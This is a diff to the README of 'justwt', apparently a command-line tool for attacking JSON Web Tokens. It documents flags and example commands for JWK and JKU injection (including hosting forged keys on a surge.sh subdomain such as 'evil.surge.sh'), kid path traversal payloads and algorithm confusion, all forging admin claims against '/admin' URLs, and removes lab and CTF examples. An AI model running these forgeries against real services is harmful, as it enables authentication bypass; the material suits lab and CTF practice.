@@ -105,7 +105,6 @@ justwt -jwt $TOKEN \
 
 **Flags:**
 - `-jwk` — Enable JWK injection
-- `-private-key <file>` — Use PEM private key instead of generating one
 
 ---
 
@@ -122,10 +121,9 @@ justwt -jwt $TOKEN \
 
 **Flags:**
 - `-jku` — Enable JKU injection
-- `-surge-name <name>` — Custom surge.sh subdomain (e.g., `httpcats` → `httpcats.surge.sh`)
+- `-surge-name <name>` — Custom surge.sh subdomain (e.g., `evil` → `evil.surge.sh`)
 - `-jku-url <url>` — Manual JKU endpoint (skip auto-deploy)
 - `-jku-encode` — Base64 encode JKU value (bypass path filters)
-- `-private-key <file>` — Use PEM private key
 
 **Example with custom JKU:**
 ```bash
@@ -139,7 +137,7 @@ justwt -jwt $TOKEN \
 
 ### 6️⃣ **KID PATH TRAVERSAL** — Exploit key lookup
 
-Try path traversal payloads (`../dev/null`, `../../dev/null`, etc.) and SQL injection in `kid` field.
+Try path traversal payloads (`../dev/null`, `../../dev/null`, etc.) in `kid` field.
 
 ```bash
 justwt -jwt $TOKEN \
@@ -170,12 +168,12 @@ justwt -jwt $TOKEN \
 justwt -jwt $TOKEN \
   -payload '{"isAdmin": true, "sub": "admin"}' \
   -url https://target/admin \
-  -alg-confusion -target /path/to/public.pem -v
+  -alg-confusion -target https://target/jwks.json -v
 ```
 
 **Flags:**
 - `-alg-confusion` — Enable algorithm confusion
-- `-target <url|file>` — Public key URL or file path
+- `-target <url>` — Public key URL
 - `-sig2n-token2 <jwt>` — 2nd JWT for sig2n extraction (requires Docker)
 
 ---
@@ -186,7 +184,6 @@ justwt -jwt $TOKEN \
 |------|-------------|
 | `-cookie <name>` | Cookie name for token (default: `session`) |
 | `-v` | Verbose mode (show all token headers) |
-| `-private-key <file>` | PEM private key for RSA signing (JWK/JKU) |
 
 **Example:**
 ```bash
@@ -200,74 +197,6 @@ justwt -jwt $TOKEN \
 
 ---
 
-## 🚩 Run All Attacks
-
-```bash
-justwt -jwt $TOKEN \
-  -payload '{"isAdmin": true, "sub": "admin"}' \
-  -url https://target/admin \
-  -all -v
-```
-
-This runs: payload mutation → alg:none → brute-force → JWK → JKU → KID traversal → algorithm confusion
-
----
-
-## 📊 Output Format
-
-**Success:**
-```
-✓ #12  JKU (JWKS Set)
-    eyJhbGciOiJSUzI1NiIsImp...
-    [+] HTTP 200 | Length: 1208 ← SUCCESS
-```
-
-**Failed:**
-```
-✗ #1   Payload (keep sig)
-    eyJhbGciOiJSUzI1NiI...
-    [~] HTTP 401 | Length: 500
-```
-
-**Color Codes:**
-- `[+]` Success (Green)
-- `[x]` Error (Red)
-- `[~]` Info (Yellow)
-- `[!]` Warning (Yellow)
-
----
-
-## 💡 Real-World Examples
-
-### PortSwigger Lab: JWT with JWK
-
-```bash
-justwt -jwt eyJraWQiOiI5MTU2ZDk0NS1jNzZlLTQyNzAtOWUzMC02MWRjMzA0MTUwODciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODM2OTMyNCwic3ViIjoid2llbmVyIn0.xyz... \
-  -payload '{"sub":"administrator","iss":"portswigger","exp":1738369324}' \
-  -url https://0a1234567890abcd.web-security-academy.net/admin \
-  -jwk -v
-```
-
-### CTF: JKU Injection with Custom Subdomain
-
-```bash
-justwt -jwt $HARDEN_TOKEN \
-  -payload '{"isAdmin":true,"sub":"admin"}' \
-  -url https://httpcats.hardenctf.fr/admin \
-  -jku -surge-name httpcats \
-  -cookie access-token -v
-```
-
-### Manual Algorithm Confusion
-
-```bash
-justwt -jwt $TOKEN \
-  -payload '{"admin":true}' \
-  -url https://target/admin \
-  -alg-confusion -target https://target/jwks.json -v
-```
-
----
 
 ## 📝 Requirements
 
@@ -277,7 +206,12 @@ justwt -jwt $TOKEN \
 
 Install surge:
 ```bash
-npm install -g surge
+npm install --global surge
+```
+
+Install Docker sig2n:
+```bash
+docker pull portswigger/sig2n
 ```
 
 ---
@@ -296,10 +230,4 @@ npm install -g surge
 
 ---
 
-## 📄 License
-
-MIT
-
----
-
-**Made with 🔥 by buzz**
+**buzz**
